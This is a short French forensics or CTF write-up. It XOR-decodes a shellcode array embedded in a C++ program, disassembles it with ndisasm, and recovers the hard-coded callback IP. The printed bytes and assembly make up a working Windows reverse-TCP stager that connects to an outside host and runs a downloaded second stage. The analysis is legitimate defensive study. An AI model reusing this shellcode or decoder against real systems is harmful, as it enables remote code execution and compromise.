## Il est possible de recupérer le shellcode, de décoder celui-ci car un xor est fait avec

```c
#include <iostream>
#include <iomanip>
#include <vector>

void RetrieveData(unsigned char rt0[], size_t rt1) {
	const unsigned char key[] = { 0x99, 0x13, 0x32 };
	size_t keySize = sizeof(key);

	for (size_t i = 0; i < rt1; ++i) {
		rt0[i] = rt0[i] ^ key[i % keySize];
	}
}

int main() {
    unsigned char xb0[] = "\x65\xfb\xbd\x99\x13\x32\xf9\x22\xe0\xfd\x98\x60\xa9\x9a\xd7\x12\x41\x3e\x12\x41\x26\x12\x61\x1a\xa8\xec\x3d\x2e\x59\x14\xa8\xd3\x9e\xa5\x72\x4e\x9b\x3f\x12\x58\xdc\x3f\x98\xd4\x7b\xec\xfc\x60\x12\x41\x22\xce\x98\x70\xa5\x12\xe2\x12\x53\x4a\x1c\xd3\x46\xd5\x12\xe2\x12\x5b\x2a\xc9\x98\x6a\xb9\x12\xe1\x1c\xda\x46\xa5\x5a\xb9\xad\x98\x03\x66\x12\xe4\xa8\xd3\xf3\x56\x1e\x9e\x98\xd4\x0a\x79\x66\xc6\x9a\x6e\xca\xa2\x6e\x16\xec\xf3\x6a\x12\x4b\x16\x98\xc0\x54\x12\x1f\x79\x12\x4b\x2e\x98\xc0\xb9\x9d\x98\x33\x49\x9a\x76\xbd\x37\x69\xc2\x72\x6b\xc3\x42\xcd\x79\x4b\x6d\xc3\x98\x20\x70\x93\xcd\x66\xec\x6f\xf1\x20\x00\x99\x13\x5a\xee\x60\x00\xc6\x47\x5a\xd5\x64\x14\x9e\x9a\xda\x66\xc3\x8a\x09\x12\x32\x99\x3a\xf6\xcd\x43\x5a\xb0\x93\x59\x99\xec\xe7\xf3\x19\x5a\xcb\x51\x31\x68\x7b\x30\x99\xae\x57\x10\xf5\x62\xc9\x43\x62\xd9\x43\x72\xc9\x7b\xd8\x96\xcc\xd2\x66\xc6\xa5\xf3\x03\x64\xce\x7b\xab\x3c\x67\x53\x66\xc6\xb7\x59\x67\x38\x66\x5d\x3a\xec\xff\xda\xfe\x13\x32\x99\x79\x32\xf3\x17\x64\xce\x7b\x30\x40\xdb\x6d\x66\xc6\xb1\x61\x13\x4c\xaf\x98\x04\xf3\x53\x5a\x99\x03\x32\x99\x45\x58\x99\x7b\x6a\x3d\x40\xd7\x66\xc6\xa1\xca\x79\x32\xcf\x40\x65\xf1\x11\xeb\x51\x4c\xcd\x4c\x90\xca\x99\x6e\x1a\xc1\x7b\x32\xd9\x13\x32\xf3\x13\x62\xf1\x18\x1d\x96\x23\xcd\x4c\x44\x5a\xec\x7d\x7f\xf8\xec\xe7\xc7\x4d\xcd\x95\x37\x3d\x1c\x63\xcd\x66\xec\xdb\x02\xec\xcd\x66\x12\xf1\xb0\xd5\x47\x58\xd0\x89\x69\xa6\x90\xcf\x79\x32\xca\xec\xe7"; // Input character array
    size_t xb1 = sizeof(xb0) - 1; // Subtract 1 to exclude the null-terminating character
    RetrieveData(xb0, xb1);

    // Print the decoded array in hexadecimal format
    std::cout << "Decoded xb0 array in hexadecimal: ";
    for (size_t i = 0; i < xb1; ++i) {
        std::cout << "\\x" << std::setw(2) << std::setfill('0') 
                  << std::hex << std::uppercase << (0xFF & static_cast<int>(xb0[i]));
        if (i < xb1 - 1) {
        }
    }
    std::cout << std::endl;

    // Print the decoded array as a string
    std::cout << "Decoded xb0 array as string: ";
    for (size_t i = 0; i < xb1; ++i) {
        std::cout << static_cast<char>(xb0[i]);
    }
    std::cout << std::endl;

    return 0;
}
```
Après on fait donc:
```bash
echo -ne "\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x89\xe5\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x31\xff\x0f\xb7\x4a\x26\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52\x8b\x52\x10\x57\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x50\x8b\x58\x20\x01\xd3\x85\xc9\x74\x3c\x49\x8b\x34\x8b\x31\xff\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\x52\x42\x03\xf1\x68\x02\x00\xbd\x65\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5" | ndisasm -b 32 -
```

Pour obtenir le shellcode en ASM. On obtient :
```asm
00000000  FC                cld
00000001  E88F000000        call 0x95
00000006  60                pusha
00000007  31D2              xor edx,edx
00000009  648B5230          mov edx,[fs:edx+0x30]
0000000D  89E5              mov ebp,esp
0000000F  8B520C            mov edx,[edx+0xc]
00000012  8B5214            mov edx,[edx+0x14]
00000015  8B7228            mov esi,[edx+0x28]
00000018  31FF              xor edi,edi
0000001A  0FB74A26          movzx ecx,word [edx+0x26]
0000001E  31C0              xor eax,eax
00000020  AC                lodsb
00000021  3C61              cmp al,0x61
00000023  7C02              jl 0x27
00000025  2C20              sub al,0x20
00000027  C1CF0D            ror edi,byte 0xd
0000002A  01C7              add edi,eax
0000002C  49                dec ecx
0000002D  75EF              jnz 0x1e
0000002F  52                push edx
00000030  8B5210            mov edx,[edx+0x10]
00000033  57                push edi
00000034  8B423C            mov eax,[edx+0x3c]
00000037  01D0              add eax,edx
00000039  8B4078            mov eax,[eax+0x78]
0000003C  85C0              test eax,eax
0000003E  744C              jz 0x8c
00000040  01D0              add eax,edx
00000042  8B4818            mov ecx,[eax+0x18]
00000045  50                push eax
00000046  8B5820            mov ebx,[eax+0x20]
00000049  01D3              add ebx,edx
0000004B  85C9              test ecx,ecx
0000004D  743C              jz 0x8b
0000004F  49                dec ecx
00000050  8B348B            mov esi,[ebx+ecx*4]
00000053  31FF              xor edi,edi
00000055  01D6              add esi,edx
00000057  31C0              xor eax,eax
00000059  C1CF0D            ror edi,byte 0xd
0000005C  AC                lodsb
0000005D  01C7              add edi,eax
0000005F  38E0              cmp al,ah
00000061  75F4              jnz 0x57
00000063  037DF8            add edi,[ebp-0x8]
00000066  3B7D24            cmp edi,[ebp+0x24]
00000069  75E0              jnz 0x4b
0000006B  58                pop eax
0000006C  8B5824            mov ebx,[eax+0x24]
0000006F  01D3              add ebx,edx
00000071  668B0C4B          mov cx,[ebx+ecx*2]
00000075  8B581C            mov ebx,[eax+0x1c]
00000078  01D3              add ebx,edx
0000007A  8B048B            mov eax,[ebx+ecx*4]
0000007D  01D0              add eax,edx
0000007F  89442424          mov [esp+0x24],eax
00000083  5B                pop ebx
00000084  5B                pop ebx
00000085  61                popa
00000086  59                pop ecx
00000087  5A                pop edx
00000088  51                push ecx
00000089  FFE0              jmp eax
0000008B  58                pop eax
0000008C  5F                pop edi
0000008D  5A                pop edx
0000008E  8B12              mov edx,[edx]
00000090  E980FFFFFF        jmp 0x15
00000095  5D                pop ebp
00000096  6833320000        push dword 0x3233
0000009B  687773325F        push dword 0x5f327377
000000A0  54                push esp
000000A1  684C772607        push dword 0x726774c
000000A6  89E8              mov eax,ebp
000000A8  FFD0              call eax
000000AA  B890010000        mov eax,0x190
000000AF  29C4              sub esp,eax
000000B1  54                push esp
000000B2  50                push eax
000000B3  6829806B00        push dword 0x6b8029
000000B8  FFD5              call ebp
000000BA  6A0A              push byte +0xa
000000BC  68524203F1        push dword 0xf1034252
000000C1  680200BD65        push dword 0x65bd0002
000000C6  89E6              mov esi,esp
000000C8  50                push eax
000000C9  50                push eax
000000CA  50                push eax
000000CB  50                push eax
000000CC  40                inc eax
000000CD  50                push eax
000000CE  40                inc eax
000000CF  50                push eax
000000D0  68EA0FDFE0        push dword 0xe0df0fea
000000D5  FFD5              call ebp
000000D7  97                xchg eax,edi
000000D8  6A10              push byte +0x10
000000DA  56                push esi
000000DB  57                push edi
000000DC  6899A57461        push dword 0x6174a599
000000E1  FFD5              call ebp
000000E3  85C0              test eax,eax
000000E5  740A              jz 0xf1
000000E7  FF4E08            dec dword [esi+0x8]
000000EA  75EC              jnz 0xd8
000000EC  E867000000        call 0x158
000000F1  6A00              push byte +0x0
000000F3  6A04              push byte +0x4
000000F5  56                push esi
000000F6  57                push edi
000000F7  6802D9C85F        push dword 0x5fc8d902
000000FC  FFD5              call ebp
000000FE  83F800            cmp eax,byte +0x0
00000101  7E36              jng 0x139
00000103  8B36              mov esi,[esi]
00000105  6A40              push byte +0x40
00000107  6800100000        push dword 0x1000
0000010C  56                push esi
0000010D  6A00              push byte +0x0
0000010F  6858A453E5        push dword 0xe553a458
00000114  FFD5              call ebp
00000116  93                xchg eax,ebx
00000117  53                push ebx
00000118  6A00              push byte +0x0
0000011A  56                push esi
0000011B  53                push ebx
0000011C  57                push edi
0000011D  6802D9C85F        push dword 0x5fc8d902
00000122  FFD5              call ebp
00000124  83F800            cmp eax,byte +0x0
00000127  7D28              jnl 0x151
00000129  58                pop eax
0000012A  6800400000        push dword 0x4000
0000012F  6A00              push byte +0x0
00000131  50                push eax
00000132  680B2F0F30        push dword 0x300f2f0b
00000137  FFD5              call ebp
00000139  57                push edi
0000013A  68756E4D61        push dword 0x614d6e75
0000013F  FFD5              call ebp
00000141  5E                pop esi
00000142  5E                pop esi
00000143  FF0C24            dec dword [esp]
00000146  0F8570FFFFFF      jnz near 0xbc
0000014C  E99BFFFFFF        jmp 0xec
00000151  01C3              add ebx,eax
00000153  29C6              sub esi,eax
00000155  75C1              jnz 0x118
00000157  C3                ret
00000158  BBF0B5A256        mov ebx,0x56a2b5f0
0000015D  6A00              push byte +0x0
0000015F  53                push ebx
00000160  FFD5              call ebp
```

On remarque alors cette valeur en little endian:
```
000000BC  68524203F1        push dword 0xf1034252
```

On la passe en big endian avec:
```
https://blockchain-academy.hs-mittweida.de/litte-big-endian-converter/
```

Puis on met la valeur ici:
```
https://codebeautify.org/hex-to-ip-converter
```

On retrouve notre ip.